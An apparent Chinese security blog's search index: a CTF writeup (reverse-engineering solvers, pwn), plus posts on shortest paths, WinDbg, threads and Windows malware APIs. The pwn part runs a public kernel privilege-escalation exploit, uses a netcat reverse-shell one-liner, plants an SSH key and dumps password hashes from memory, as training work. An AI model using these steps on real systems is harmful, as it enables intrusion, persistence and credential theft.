<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[全球某工商第二届writeup]]></title>
    <url>%2F2018%2F05%2F07%2Fwp_2018_5_7_zjgsctf%2F</url>
    <content type="text"><![CDATA[这次比赛，自己出题自己做的。 RE签到题(有名为送分题)分析拿到题目，发现是文本，直接打开，发现加密函数被写成汇编啦，读汇编就可以知道逻辑结构。即知道是将每一个与或0x30后加1，写出加密算法即可12345enc="\x55\x5b\x50\x56\x4a\x66\x54\x5b\x52\x5e\x5c\x54\x6e\x43\x1f\x6e\x41\x54\x6e\x43\x57\x58\x42\x6e\x58\x42\x6e\x5e\x5d\x5b\x48\x6e\x50\x42\x5c\x4c"s=''for i in range(len(enc)): s += chr((ord(enc[i])^0x30)+1)print s flagflag{Welcome_t0_re_this_is_only_asm} 出题思路现实工作中，汇编还是需要熟练的，这道题主要是为了考察看汇编的能力。 babyre分析拿到题目，先查壳，发现没有壳，直接运行，输入flag返回是否正确，先拖入ida里。找到主函数f5发现不能反汇编成伪代码，发现栈不平衡，无法解析，这里可以patch，参考:https://esebanana.github.io/2018/03/26/re_ida/发现是input先base64加密，在进行rc4加密，最后进行硬编码比较,写出解密代码(我是在kali里运行的，外面的环境不好配置):1234567891011#coding=utf8from Crypto.Cipher import ARC4import base64import stringprint 'ARC4------------------------------------'key='flag&#123;this_is_not_the_flag_hahaha&#125;'enc="\x20\xc3\x1a\xae\x97\x3c\x7a\x41\xde\xf6\x78\x15\xcb\x4b\x4c\xdc\x26\x55\x8b\x55\xe5\xe9\x55\x75\x40\x3d\x82\x13\xa5\x60\x13\x3b\xf5\xd8\x19\x0e\x47\xcf\x5f\x5e\xde\x9d\x14\xbd"ob2=ARC4.new(key)enc1=ob2.decrypt(enc)print enc1print base64.b64decode(enc1) 发现bese64解出来是乱码，回去看ck1，是base64没有错啊，？？？。最后发送是base64的表被改变啦，再次写出解密代码1234567891011121314151617181920#coding=utf8from Crypto.Cipher import ARC4import base64import stringprint 'ARC4------------------------------------'key='flag&#123;this_is_not_the_flag_hahaha&#125;'enc="\x20\xc3\x1a\xae\x97\x3c\x7a\x41\xde\xf6\x78\x15\xcb\x4b\x4c\xdc\x26\x55\x8b\x55\xe5\xe9\x55\x75\x40\x3d\x82\x13\xa5\x60\x13\x3b\xf5\xd8\x19\x0e\x47\xcf\x5f\x5e\xde\x9d\x14\xbd"ob2=ARC4.new(key)enc1=ob2.decrypt(enc)print enc1print 'base64--------------------------------------'s=''Base64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"table= "ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/"for ch in enc1: if ch in Base64: s = s + Base64[string.find(table,str(ch))] elif ch == '=': s = s + '=' print base64.b64decode(s) flagflag{y0u_know_rc4_and_base64_ha$} 出题思路这道题主要考察选手对常见加密算法的base64和rc4的熟悉程度，故意把函数的栈破坏，导致ida识别失败，同时也考察能对ida的异常进行处理。 New driver分析拿到题目，先查壳，发现有upx壳，这个壳很简单，可以手脱，不过发现用od打开的时候，一运行就退出啦，脱进ida里，发现有tls1、去掉节区里的tls,参考https://esebanana.github.io/2017/10/10/re_tls/2、脱下upx壳，https://esebanana.github.io/2018/03/15/re_tou_ke/3、可以进行分析啦发现主函数发现有两个线程函数，one和two，后面是一个与enc_flag比较，那主要看看one,two都做了什么加密。分析one:一个sleep函数(可能是线程one与线程two替换加密)，还有一个加密函数，进去发现不能f5,这里也patch这个ck1(与babyre方法一样)，最后进行lenn–;发现必须是大写或小写，否者就退出，如果是小写，则将enc=table[enc-38];若为大写，则enc=table[enc-96]分析two：发现只是lenn–那么输入时偶数时不变，奇数是进行加密，写出解密函数:123456789101112131415table="QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"enc="\x54\x4f\x69\x5a\x69\x5a\x74\x4f\x72\x59\x61\x54\x6f\x55\x77\x50\x6e\x54\x6f\x42\x73\x4f\x61\x4f\x61\x70\x73\x79\x53\x79"lenn=len(enc)print lenns=[]for i in range(lenn): if i%2==0: s.append(enc[i]) else: k = table.index(enc[i]) if k&gt;26: s.append(chr(k + 38)) else: s.append( chr(k + 96))print ''.join(s) flagflag{ThisisthreadofwindowshahaIsESE} 出题思路主要考察简单脱壳，已及PE的文件结构tls,最后考察了对线程的理解和一个简单的加密函数， Old driver分析拿到题目，先查壳，没有壳，用ida打开发现一个函数地址被与或啦，这里想到smc，可以参考https://esebanana.github.io/2017/10/10/re_tls/用od打开，运行在这里dump出程序出来，再次ida打开前5个必须是flag{,最后必须是}进入ck1，首先发现有验证5-11位的，这里v3不知道，不过我们可以从od里知道v3的数据。接着又是将12-17位进行base64加密在进行比较，接着进入下一个函数这里可以发现是一个迷宫，是用来验证18-39位的，画出迷宫，走出迷宫便可以啦。解密函数如下:12345678910111213141516import base64#----------------------------enc1='flag&#123;'#----------------------------enc2='\xf2\xee\xef\xf5\xd9\xef's=[]s.append(enc1)for x in enc2: s.append(chr(ord(x)^0x86))#----------------------------enc3='\x63\x31\x39\x7a\x62\x57\x4e\x66'data=base64.b64decode(enc3)s.append(data)#-----------------------------s.append('waaaaawwwww22222qqqaaw&#125;')print ''.join(s) flagflag{this_is_smc_waaaaawwwww22222qqqaaw} 出题思路这里考察了4层smc，因为smc在恶意软件中经常使用，防免杀。又考察啦od的patch能力，已经base64,走迷宫等 秋名山车神分析拿到题目，发现是elf的，先放进ida里面，代码很简单先判断输入的是否是64位，然后fork()一个子进程，然后子进程与父进程进行通信，先看看父进程的加密:发现是一个rot13再来看看子进程发现将父进程加密后的数据读出来，在进行矩阵乘法，最后进行比较，写出解密代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from numpy import *;mat1=[[ 0x2B, 0x16, 0x1E, 0x53, 0x35, 0x39, 0x20, 0x29 ],[ 0x35, 0x63, 0x0A, 0x28, 0x2C, 0x06, 0x32, 0x2A ],[ 0x55, 0x39, 0x14, 0x5F, 0x20, 0x19, 0x34, 0x21 ],[ 0x19, 0x0B, 0x5A, 0x09, 0x50, 0x34, 0x6F, 0x5C ],[ 0x16, 0x1A, 0x68, 0x63, 0x34, 0x4E, 0x16, 0x45 ],[ 0x4C, 0x53, 0x2F, 0x3F, 0x3F, 0x28, 0x69, 0x51 ],[ 0x39, 0x44, 0x12, 0x24, 0x0A, 0x4D, 0x55, 0x31 ],[ 0x49, 0x3B, 0x40, 0x3B, 0x43, 0x28, 0x21, 0x36 ]]enc=[[39430, 34714, 32196, 36639, 34988, 34059, 30813, 33326], [36796, 32617, 33253, 34580, 34162, 34694, 27284, 30462], [43121, 39454, 38526, 40343, 40267, 39622, 32312, 35938], [52554, 37142, 43063, 43360, 41895, 39806, 44188, 43934], [51532, 44412, 41672, 48518, 45549, 44436, 41365, 45032], [60785, 49721, 52606, 54361, 52991, 52156, 47474, 50031], [43050, 35311, 36031, 39633, 34447, 34470, 31270, 31954],[49152, 43386, 42096, 46024, 45029, 43961, 36733, 42762]]#矩阵的逆#B*A=C#B=A1*CA=mat(mat1)#A的逆矩阵A1=linalg.inv(A)C=mat(enc)B1=A1*Cc=B1.tolist()s=''for j in range(8): k=c[j] for i in range(8): kk=int(k[i])+0.5 if k[i]&gt;kk: s=s+chr(int(k[i])+1) else: s=s+chr(int(k[i]))def rot13(s): flag='' le=len(s) for ch in s: tmp=ord(ch)+13 if ch.isupper(): if tmp&gt;90: tmp=tmp-26 elif ch.islower(): if tmp&gt;122: tmp=tmp-26 else: tmp=ord(ch) flag +=chr(tmp) return flags=rot13(s)print s flagflag{y0u_are_g0Od_for_Math_this_is_Matrix_5f0256b0f586a7b55dasd} 出题思路主要考察进程间的通讯，rot13,和矩阵乘法的运用。 题目这里有全部题目的源代码，解密代码和程序链接：https://pan.baidu.com/s/1qEr6y0JdqEVI-B9CoIBvqQ 密码：uziu pwn这是队友出的题目，自己也去做了做，也发现很有意思 得到shell第一种方法在用户名输入%p%p%p%p%p%p%p%p，发现第一个字符串有特别，用%s输出，发现Bob,密码:随便猜测，发现是123456（当时我随便输了123，就没有猜测啦,用的是第二种方法） 第二种方法exp12345678910111213141516171819202122232425#coding=utf8from pwn import *r = remote("10.21.13.202",1234)r.recvuntil("请输入要进行的操作：")r.sendline("2")r.recvuntil("第一步，请做100次基本的数学运算吧：")for i in range(100): r.recvuntil(":") data=r.recvuntil("=") k1=int(data.split(' ')[1],10) f=data.split(' ')[2] k2=int(data.split(' ')[3],10) if f=='+': key=k1+k2 elif f=='-': key=k1-k2 elif f=='*': key=k1*k2 elif f=='/': key=k1/k2 r.sendline(str(key))r.interactive() 得到加密后在字符串，题目是区块链+各种解码猜测后发现是base58，解码出来得到用户名和密码 寻找flag用命令find -name flag发现找不到，经过出题人提示，flag在root目录下，但是这个用户无法进入，当然想到提权啦。 提权uname -a发现linux内核版本，然后百度一下，发现CVE-2017-16995漏洞类似，去github上找一下，找到利用脚本，然后下载下来git clone https://github.com/iBearcat/CVE-2017-16995.git这里我不知道下载下来没有，ls一下，发现一家下载下来啦,运行12gcc exploit.c -o exploit./exploit 发现完全没有反应，蒙，完全不知道什么报错，想看错误,反弹shell 显示错误先本地监听nc -vlp 1234搭建web服务，写入反弹shell（这里改掉ip就好啦）rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.21.107.42 1234 &gt;/tmp/f多试几次就行啦。接着是发现,运行参数出错。蒙，，，，又去py出题人，出题人表示这是shell环境不一样，提示ssh连上去 ssh登录ssh登录有两种方法，方法1:用户名密码登录12ssh -l root 192.168.0.11 （默认端口22）ssh -l root -p 12333 216.230.230.114 （修改端口12333） 方法2:用户免密码登录本地生成公私钥，将公钥放在需要ssh登录的机器上本地生成公私钥,执行这条命令，就会在根目录上发现.ssh目录ssh-keygen -t rsa利用ls -a查看进入.ssh目录，将id_rsa.pub的内容复制到需要ssh登录的机器上，在已经得到shell的机器上，进入当前用户目录，创建一个.ssh目录,并将公钥写入authorized_keys文件1234mkdir .sshcd .ssh echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBt2kJefRVdsr5DcRemSvHSVRIJZ+GchQ3bK4mHPP2+mkItPz28UE1+V0SvAbzqyMVZQeWuV0wwluoco5zHcuk5ki/Mz/9nn4XKC55qp90Qu+7spSg8Ff496Gkz65sMpNOWpVpyKJy5iwBeCjyTLlcy3hTHqpEeIZvGF8B/Pku5vxqhf1GnOkqUjmv2Fzr2cgovmiE1pilZBB3lwtu6IGZzbO5pHqwdZ9WrDDNwbwQ6+dK0kZFqZN1XgsMeBOezSL19NnWZLx+e/byzrgCxf6fXefUlC4tja+49ibGsKbv7RbH18Kk0af46O1hWUAeBL1SPGFad+Bv/X4X/XQC4Wcx root@kali" &gt; authorized_keys miscNTFS创建一个隐藏文件echo 666666&gt;&gt;suzhu.txt:stream.txt显示隐藏文件notepad suzhu.txt:stream.txt隐藏图片type aaa.jpg&gt;&gt;suzhu.txt:aaa.jpg打开图片mspaint suzhu.txt:aaa.jpg 内存镜像取证1、获取版本号volatility -f pc.raw imageinfo2、查看运行进程volatility -f pc.raw –profile=WinXPSP3x86 pslist3、dump出某个pid[exe程序]volatility -f pc.raw –profile=WinXPSP3x86 memdump -p 3832 -D .4、查看注册表volatility -f pc.raw –profile=WinXPSP3x86 hivelist5、dump用密码（-s 值SAM的虚拟地址，-y值system的虚拟地址）volatility -f pc.raw –profile=WinXPSP3x86 hashdump -y 0xe1036b60 -s 0xe15d9008 &gt; 1.txt6、查看用户名volatility -f pc.raw –profile=WinXPSP3x86 printkey -K “SAM\Domains\Account\Users\Names”]]></content>
      <categories>
        <category>wp</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[最短路径]]></title>
    <url>%2F2018%2F05%2F04%2Falgorithm_shortest_path%2F</url>
    <content type="text"><![CDATA[Floyd-Warshall算法是解决任意两点间的最短路径的一种算法。通常可以在任何图中使用，包括有向图、带赋权边的图。 floyd-warshall算法介绍单独一条边的路径也不一定是最佳路径。 从任意一条单边路径开始。所有两点之间的距离是边的权的和，(如果两点之间没有边相连, 则为无穷大）。 从第一个顶点开始，依次将每个顶点作为媒介 k，然后对于每一对顶点 u 和 v ，查看其是否存在一条经过 k 的，距离比已知路径更短的路径，如果存在则更新它。 算法分析用邻接矩阵map[][]存储有向图，用dist[i][j]表示i到j的最短路径。设G的顶点为V={1,2,3…n}，对于任意一对顶点i,j属于V，假设i到j有路径且中间节点皆属于集合{1,2,3…k}，P是其中的一条最小权值路径。就是i到j的最短路径P所通过的中间顶点最大不超过k。 实现12345678910111213141516171819202122232425262728293031323334353637383940414243#根据最短路径矩阵，输出两点之间对应的路线 def getRoutes(a,path,start,end): #最短路径矩阵 rts = [] #存放路线 rts.append(start) i = start-1 while path[i][end-1] != -1: rts.append(path[i][end-1]+1) i = path[i][end-1] rts.append(end) dst=a[start-1][end-1] return rts,dst#求最短路径Floyd:地图tmp,lenn为点数，得到i-&gt;j(从i点到j的最短路径)的地图A,def Floyd(map_s,lenn): A = map_s #存放到某点必须经过的路径点,生成lenn的二维数组，开始全部为-1，代表不能通过 path = [[-1 for i in range(lenn)] for j in range(lenn)] for k in xrange(lenn): #不断试图往两点i,j之间添加新的点k，更新最短距离 for i in xrange(lenn): for j in xrange(lenn): if A[i][j] &gt; A[i][k] + A[k][j]: A[i][j] = A[i][k] + A[k][j] path[i][j] = k return A,path #返回A二维数组是每个点到其它点的最短路径, path是最短路径的路径，-1表示不通 def main(): #将各个点变成 INF=10000 map1 = [ [0 ,2 ,10 ,5 ,3 ,INF ], [INF ,0 ,12 ,INF ,INF ,10 ], [INF ,INF ,0 ,INF ,7 ,INF ], [2 ,INF ,INF ,0 ,2 ,INF ], [4 ,INF ,INF ,1 ,0 ,INF ], [10 ,INF ,1 ,INF ,2 ,0 ] ] map2,path = Floyd(map1,6) print 'path:%s'%(path) print 'A:%s'%(map2) rts,dst = getRoutes(map2,path,6,2) print rts print dstmain()]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析———使用WinDbg调试内核]]></title>
    <url>%2F2018%2F04%2F19%2Fre_evil_4%2F</url>
    <content type="text"><![CDATA[WinDbg是微软提供的一个免费调试器，虽然在恶意代码分析中，WinDbg不如OllyDbg调试器那么流行，不过它支持内核调试。 WinDbg驱动与内核代码为了更好的理解WinDbg内核调试，在介绍内核代码调试之前，首先介绍内核代码的工作原理、恶意代码使用内核代码的原因，以及内核代码存在的一些特殊挑战等。Windows设备驱动简称为驱动，它让第三方开发商在Windows内核模式下运行代码。由于驱动程序常驻内存，并且负责响应用户应用程序的请求，因此分析它十分困难。另外，由于应用程序不能直接与驱动设备程序通讯，而是直接访问设备对象，向具体的物理设备发送请求，使得驱动程序更加难以分析。设备对象由 调试模式Windbg.exe是Windows的一个调试工具，它支持两种调试模式，即“实时调试模式(Living)”和“事后调试模式(Postmortem)”。 实时模式被调试的程序正在运行当中，调试器可以实时分析、修改被调试目标的状态，如寄存器、内存、变量，调试exe可执行程序或双击双机实时调试都属于这种模式； 事后模式被调试的程序已经执行结束，现在只是事后对它保留的快照进行分析，快照就是转储文件(Dump文件)。 调试命令分为3种 ###]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[线程与进程]]></title>
    <url>%2F2018%2F04%2F09%2Fre_thread_and_process%2F</url>
    <content type="text"><![CDATA[进程与线程是最常用的方式 进程进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。 Windows创建一个新的进程需要用到这个函数CreateProcess，下面是代码范例:123456789101112 BOOL CreateProcess( LPCTSTR lpApplicationName, // 应用程序名称 LPTSTR lpCommandLine, // 命令行字符串 LPSECURITY_ATTRIBUTES lpProcessAttributes, // 进程的安全属性 LPSECURITY_ATTRIBUTES lpThreadAttributes, // 线程的安全属性 BOOL bInheritHandles, // 是否继承父进程的属性 DWORD dwCreationFlags, // 创建标志 LPVOID lpEnvironment, // 指向新的环境块的指针 LPCTSTR lpCurrentDirectory, // 指向当前目录名的指针 LPSTARTUPINFO lpStartupInfo, // 传递给新进程的信息 LPPROCESS_INFORMATION lpProcessInformation // 新进程返回的信息 ); 创建一个线程的例子123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;stdio.h&gt; int main(int argc, char* argv[])&#123; TCHAR szCommandLine[] = TEXT("NOTEPAD");//或者WCHAR //LPWSTR szCommandLine = TEXT("NOTEPAD");//错误 //STARTUPINFO si = &#123; sizeof(si) &#125;; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); si.dwFlags = STARTF_USESHOWWINDOW; // 指定wShowWindow成员有效 si.wShowWindow = TRUE; // 此成员设为TRUE的话则显示新建进程的主窗口， // 为FALSE的话则不显示 BOOL bRet = ::CreateProcess ( NULL, // 不在此指定可执行文件的文件名 szCommandLine, // 命令行参数 NULL, // 默认进程安全性 NULL, // 默认线程安全性 FALSE, // 指定当前进程内的句柄不可以被子进程继承 CREATE_NEW_CONSOLE, // 为新进程创建一个新的控制台窗口 NULL, // 使用本进程的环境变量 NULL, // 使用本进程的驱动器和目录 &amp;si, &amp;pi); if(bRet) &#123; WaitForSingleObject(pi.hProcess, INFINITE); // 既然我们不使用两个句柄，最好是立刻将它们关闭 ::CloseHandle (pi.hThread); ::CloseHandle (pi.hProcess); printf(" 新进程的进程ID号：%d \n", pi.dwProcessId); printf(" 新进程的主线程ID号：%d \n", pi.dwThreadId); &#125; return 0;&#125; Linuxfork是linux下创建进程，这里通过pipe来进行进程间的通讯(利用共享内存)123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main()&#123; int n; int fd[2]; char buff[128] = &#123;0&#125;; pid_t pid; if(pipe(fd)&lt;0) &#123; exit(1); &#125; if((pid=fork())&lt;0) &#123; exit(1); &#125; if( pid&gt;0 ) &#123; close(fd[0]); write(fd[1],"hello\n",6); wait(NULL); &#125; else &#123; close(fd[1]); n=read(fd[0],buff,128); write(STDOUT_FILENO,buff,n); &#125; return 0;&#125; 线程Windows进程是资源分配的最小单位，而线程呢，则是CPU运行的最小单位。1234567891011121314151617181920212223242526272829303132333435363738#include &lt;windows.h&gt; //线程函数 DWORD WINAPI printThread(LPVOID lpParameter) &#123; for (int i = 0; i &lt; 100; i++) &#123; printf("sub thread - %d\n",i+(int)lpParameter); Sleep(500); &#125; return 0; &#125; int _tmain(int argc, _TCHAR* argv[]) &#123; //创建一个线程，并让其挂起，不运行 HANDLE hThread = CreateThread(0, 0, printThread, (LPVOID)10, CREATE_SUSPENDED, 0); for (int i = 0; i &lt; 100; i++) &#123; printf("main thread - %d\n", i + 1); //当主线程输出到5的倍数时，恢复子线程运行 if (i % 5 == 0) &#123; ResumeThread(hThread); &#125; //当主线程输出到8的倍数时，暂停子线程运行 if (i % 8 == 0) &#123; SuspendThread(hThread); &#125; //直接杀掉子线程 //TerminateThread(hThread,0); Sleep(500); &#125; return 0; &#125; Linux线程标识线程有ID, 但不是系统唯一, 而是进程环境中唯一有效.线程的句柄是pthread_t类型, 该类型不能作为整数处理, 而是一个结构. 线程退出的条件下面任意一个都可以。1.调用pthread_exit函数退出。2.其他线程调用pthread_cancel取消该线程，且该线程可被取消。3.创建线程的进程退出或者整个函数结束。4.当前线程代码执行完毕。5.其中的一个线程执行exec类函数执行新的代码，替换当前进程所有地址空间。 例子12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;pthread.h&gt; pthread_mutex_t mutex;pthread_cond_t cond;void *thread1(void *arg)&#123; pthread_cleanup_push(pthread_mutex_unlock,&amp;mutex); //提供函数回调保护 while(1)&#123; printf("thread1 is running\n"); pthread_mutex_lock(&amp;mutex); pthread_cond_wait(&amp;cond,&amp;mutex); printf("thread1 applied the condition\n"); pthread_mutex_unlock(&amp;mutex); sleep(4); &#125; pthread_cleanup_pop(0);&#125;void *thread2(void *arg)&#123; while(1)&#123; printf("thread2 is running\n"); pthread_mutex_lock(&amp;mutex); pthread_cond_wait(&amp;cond,&amp;mutex); printf("thread2 applied the condition\n"); pthread_mutex_unlock(&amp;mutex); sleep(1); &#125;&#125;int main()&#123; pthread_t thid1,thid2; printf("condition variable study!\n"); pthread_mutex_init(&amp;mutex,NULL); pthread_cond_init(&amp;cond,NULL); pthread_create(&amp;thid1,NULL,(void*)thread1,NULL); pthread_create(&amp;thid2,NULL,(void*)thread2,NULL); do&#123; pthread_cond_signal(&amp;cond); &#125;while(1); sleep(20); pthread_exit(0); return 0;&#125; 区别1234进程优点：编程、调试简单，可靠性较高。进程缺点：创建、销毁、切换速度慢，内存、资源占用大。线程优点：创建、销毁、切换速度快，内存、资源占用小。线程缺点：编程、调试复杂，可靠性较差。]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析———分析恶意Windows程序]]></title>
    <url>%2F2018%2F04%2F04%2Fre_evil_3%2F</url>
    <content type="text"><![CDATA[多数恶意代码以Windows平台为目标，并且与操作系统进行紧密交互。对基本Windoows编程概念的深刻理解会帮助你识别出恶意代码在主机上的感染迹象，跟踪恶意代码的执行(因为它们可能使用操作系统来执行代码而不是用一个跳转或调用指令)，并最终分析出恶意代码的目的。 Windows APIWindows API是一个广泛的功能集合，管理着恶意代码与微软程序库之间的交互方式。Windows API使用特定术语，名字，已经约定。 类型和匈牙利表达法多数Windows API使用它自己的 名字，来表示C语言类型。Windows总体上使用匈牙利表达法，作为API函数标识符，这个表达式 使用一个前缀命名模式windows API中的常见类型123456类型和前缀 描述WORD(w) 一个16位的无符号数值DWORD(dw) 一个双字节，32位的无符号数值Handles(H) 一个对象索引Long Pointer(L) 一个指向另一类型的指针Callback 表示一个将会被Windows API调用的函数 句柄(HANDLE)句柄是在操作系统中被打开或被创建的项。你对句柄做的唯一的事情，就是保存它，并在后续函数调用中使用它来引用同一对象。例:CreateWindowEx函数是一个句柄的简单例子。他返回一个HWND,这是一个窗口句柄。任何时候当你想要对那个窗口做些什么，比如调用DestroyWindows函数是，你就需要使用这个窗口。 文件系统函数恶意代码与系统交互的一个最常用的方式就是创建或修改文件，而且独特文件名或修改为既有的文件名是明显的基于主机的感染现象。 CreateFile这个函数被用来创建和打开文件。它可以打开已经存在的文件，管道，流，以及I/O设备。还能创建新的文件。函数结构体123456789HANDLE CreateFile( LPCTSTR,lpFileName, //指向文件名的指针 DWORD dwDesiredAccess, //访问模式（读/写） DWORD dwShareMode, //共享模式 LPSECURITY_ATTRIBUTES lpSecurityAttributes,//指向安全属性的指针 DWORD dwCreationDisposition, //如何让创建 DWORD dwFlagAndAttributes, //文件属性 HANDLE hTemplateFile //用于复制文件句柄 )； ReadFile和WriteFile这两个函数用来对文件进行读写ReadFile函数结构体123456789BOOL ReadFile( HANDLE hFile, //文件的句柄 LPVOID lpBuffer, //用于保存读入数据的一个缓冲区 DWORD nNumberOfBytesToRead, //要读入的字节数 LPDWORD lpNumberOfBytesRead, //指向实际读取字节数的指针 LPOVERLAPPED lpOverlapped //如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。 //该结构定义了一次异步读取操作。否则，应将这个参数设为NULL); WriteFile函数结构体1234567BOOL WriteFile(HANDLE hFile,//文件句柄LPCVOID lpBuffer,//数据缓存区指针DWORD nNumberOfBytesToWrite,//你要写的字节数LPDWORD lpNumberOfBytesWritten,//用于保存实际写入字节数的存储区域的指针LPOVERLAPPED lpOverlapped//OVERLAPPED结构体指针); CreateFileMapping和MapViewofFile文件映射经常被恶意代码作者使用，因为它们允许讲一个文件加载到内存中，以便更加容易地进行操作。CreateFileMapping函数负责从磁盘上加载一个文件到内存。MapViewofFile函数则返回一个指向映射的基地址指针，它可以被用来访问内存中的文件。CreateFileMapping函数结构体12345678HANDLE WINAPI CreateFileMapping(_In_HANDLE hFile,_In_opt_LPSECURITY_ATTRIBUTES lpAttributes,_In_DWORD flProtect,_In_DWORD dwMaximumSizeHigh,_In_DWORD dwMaximumSizeLow,_In_opt_LPCTSTR lpName); MapViewofFile函数结构体123456789101112131415LPVOID WINAPI MapViewOfFile( __in HANDLE hFileMappingObject, __in DWORD dwDesiredAccess, __in DWORD dwFileOffsetHigh, __in DWORD dwFileOffsetLow, __in SIZE_T dwNumberOfBytesToMap );LPVOID WINAPI MapViewOfFileEx( __in HANDLE hFileMappingObject, __in DWORD dwDesiredAccess, __in DWORD dwFileOffsetHigh, __in DWORD dwFileOffsetLow, __in SIZE_T dwNumberOfBytesToMap, __in LPVOID lpBaseAddress ); 特殊文件Windows系统中有一些特殊文件类型，它们的访问方式与普通文件不太一样。恶意程序经常使用特殊文件。比如:一下特殊文件比普通文件更隐蔽，因为它们在列出目录时不会显示出来，某些特殊文件可以提取对系统硬件和内部数据更强的访问能力。 Windows注册表Windows注册表被用来保存操作系统与程序配置信息，比如设置和选项，和文件系统一样，它是基于主机的感染迹象的很好来源，并且能够揭示出关于恶意代码功能的有用信息。Windows的早期版本使用.ini文件来保存配置信息。注册表被引入后，作为一个层次逐步提升。现在几乎所有的Windows配置信息都保存在注册表中，包括网络驱动，启动项，用户账户，以及其他信息。恶意代码经常使用注册表来完成持久驻留或者存储配置数据。恶意代码添加项到注册表中，这使它在计算机引导时能够自动运行。 你需要知道几个重要的注册表术语根键: 注册表被划分为称为根键的5个顶层节。有时，术语HKEY和储巢也被使用。每一个跟键有一个特定的目的。子键: 一个子键就像一个文件夹中的子文件夹键: 一个键是一个注册表中的文件夹，它可以包含额外的文件夹或键值。跟健和子键都是键。值项: 一个值项是一个配对的名字和值。值或数据: 值或数据是存储在注册表项中的数据。 注册表根键注册表被划分成下面5个键:12345HEKY_LOCAL_MACHINE(HKLM) 保存对本地机器全局设置HEKY_CURRENT_USER(HKCU) 保存当前用户特定的设置HEKY_CLASSES_ROOT 保存定义的类型信息HEKY_CURRENT_CONFIG 保存关于当前硬件配置的设置HEKY_USERS 定义默认用户，新用户和当前用户的配置 最常用的根键是HKLM和HKCU。 注册表编辑器(Regedit)注册表编辑器(Regedit)是windows内建的用来查看和编辑注册表的工具。 自启动程序向run子健中写入项，是一个普定设置程序自启动的方法，尽管不是一个隐蔽的技术，它任然经常被恶意代码用来自启动自身程序。(Autoruns工具可以使用) 常用注册表函数123RegOpenKeyEx 打开一个注册表进行编辑和查询(有些函数例外，大多数还是会使用的)。RegSetValueEx 添加一个新值到注册表，并设置它的数值。RegGetValue 返回注册表中一个值项的数值 网络API伯克利兼容套接字在Windows的网络选项中，恶意代码最普遍使用的是伯克利兼容套接字，在UNIX也是一样的。伯克利兼容套接字的网络功能在Windows系统中是由Winsock库实现的，主要在ws32_32.dll中，在所有库函数中，socket,connect,bind,listen,accept,send和recv函数最常用的1234567socket 创建一个套接字bind 将一个套接字绑定到特定端口，应该在accept前调用listen 准备着一个套接字将进入监听，等待入站连接accept 向一个远程套接字打开一个连接，并接受连接connect 向一个远程套接字打开一个连接，远程套接字必须在等待连接recv 从远程套接字接收数据send 发送数据到远程套接字 跟踪恶意代码的运行动态链接库(DLL)DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件恶意代码作者使用DLL的三种方式: 保存恶意代码有时候将恶意代码保存到一个DLL文件比exe文件更加有利。它可以附加到其他进程 通过使用Windows DLL可以通过windows调用dll的程序 通过使用第三方的DLL因为是动态链接，所以可以使用第三方的DLL DLL的结构dll的文件结构几乎和exe文件一模一样，只有一个单一的标志指示这是dll。DLL经常有更多的导出函数，并且导入函数较少。 进程恶意代码可以通过创建一个新的进程或修改一个已存在的进程，来执行恶意代码。创建一个新的进程需要用到这个函数CreateProcess，下面是代码范例:123456789101112 BOOL CreateProcess( LPCTSTR lpApplicationName, // 应用程序名称 LPTSTR lpCommandLine, // 命令行字符串 LPSECURITY_ATTRIBUTES lpProcessAttributes, // 进程的安全属性 LPSECURITY_ATTRIBUTES lpThreadAttributes, // 线程的安全属性 BOOL bInheritHandles, // 是否继承父进程的属性 DWORD dwCreationFlags, // 创建标志 LPVOID lpEnvironment, // 指向新的环境块的指针 LPCTSTR lpCurrentDirectory, // 指向当前目录名的指针 LPSTARTUPINFO lpStartupInfo, // 传递给新进程的信息 LPPROCESS_INFORMATION lpProcessInformation // 新进程返回的信息 ); 线程进程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。创建一个新的线程CreateThread 使用互斥量(mutex)的进程间协作互斥量是全局对象，用于协调多个进程和线程。主要用于控制共享资源的访问，并且经常被恶意代码使用(因为它们经常使用硬编码)。因为如果一个互斥量被两个不使用其它方式通讯的进程使用时，它的名字必须是互斥一致的。一个互斥量可以通过CreateMutex函数进行创建，而进程可以通过OpenMutex调用来获取另一个进程中互斥量的句柄。线程通过一个对WaitForSingleObject的调用，获取对互斥量的访问，当一个线程完成对互斥量的使用后，需要使用ReleaseMutex 